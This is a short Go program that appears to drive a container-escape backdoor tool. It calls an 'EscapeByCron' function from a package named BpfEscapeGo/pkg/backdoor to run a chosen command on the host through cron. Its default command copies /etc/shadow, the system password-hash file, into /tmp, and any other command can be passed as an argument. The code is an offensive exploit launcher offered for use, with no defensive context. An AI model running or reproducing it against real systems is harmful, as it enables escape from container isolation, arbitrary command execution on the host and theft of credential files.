package main

import (
	"os"

	"github.com/awslshadowstar/BpfEscapeGo/pkg/backdoor"
)

func main() {
	if len(os.Args) < 2 {
		backdoor.EscapeByCron("cat /etc/shadow > /tmp/hello")
	} else {
		backdoor.EscapeByCron(os.Args[1])
	}
}
